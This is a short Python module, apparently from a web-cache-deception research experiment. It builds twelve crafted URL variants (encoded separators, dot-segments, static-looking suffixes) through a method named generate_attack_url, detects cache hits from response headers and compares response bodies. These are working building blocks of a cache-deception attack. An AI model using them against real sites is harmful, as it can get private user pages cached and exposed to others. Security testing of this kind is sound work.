"""Web Cache Deception URL generation and cache-header helpers."""

from urllib.parse import urlsplit, urlunsplit


class WCDE:
    """Generate the twelve path variants used by the WCD replay experiment."""

    MODES = {
        "path_suffix": "append a static-looking suffix",
        "path_parameter": "append a semicolon path parameter",
        "encoded_path_separator": "append an encoded path separator",
        "double_encoded_separator": "append a double-encoded separator",
        "path_info": "append path-info after the endpoint",
        "encoded_path_info": "append encoded path-info",
        "matrix_parameter": "append a matrix-style parameter",
        "dot_segment": "append a dot-segment suffix",
        "encoded_dot_segment": "append an encoded dot-segment suffix",
        "slash_dot_suffix": "append a slash-dot suffix",
        "query_path_suffix": "place a static suffix in a query value",
        "fragment_like_suffix": "append a percent-encoded fragment marker",
    }

    def generate_attack_url(self, url, mode, extension=".css"):
        """Return a deterministic static-looking variant while preserving query data."""
        if mode not in self.MODES:
            raise ValueError(f"Unknown WCD mode: {mode}")
        parts = urlsplit(url)
        path = parts.path.rstrip("/") or "/"
        suffixes = {
            "path_suffix": extension,
            "path_parameter": f";cache{extension}",
            "encoded_path_separator": f"%2fcache{extension}",
            "double_encoded_separator": f"%252fcache{extension}",
            "path_info": f"/cache{extension}",
            "encoded_path_info": f"%2fcache{extension}",
            "matrix_parameter": f";v=cache{extension}",
            "dot_segment": f"/.{extension}",
            "encoded_dot_segment": f"/%2e{extension}",
            "slash_dot_suffix": f"/.cache{extension}",
            "query_path_suffix": "",
            "fragment_like_suffix": f"%23cache{extension}",
        }
        query = parts.query
        if mode == "query_path_suffix":
            query = f"{query}&_cache_path=cache{extension}" if query else f"_cache_path=cache{extension}"
        return urlunsplit((parts.scheme, parts.netloc, path + suffixes[mode], query, ""))

    @staticmethod
    def cache_headers_heuristics(headers):
        """Classify commonly emitted cache status headers without vendor lock-in."""
        normalized = {str(k).lower(): str(v).lower() for k, v in (headers or {}).items()}
        values = " ".join(normalized.get(name, "") for name in ("x-cache", "x-cache-hits", "cf-cache-status", "cache-status", "age"))
        if any(marker in values for marker in (" hit", "hit", "cached")) and "miss" not in values:
            return "hit"
        if any(marker in values for marker in ("miss", "bypass", "dynamic")):
            return "miss"
        return "unknown"

    @staticmethod
    def identicality_checks(first, second):
        """Return whether two response bodies are identical."""
        return (first or "") == (second or "")
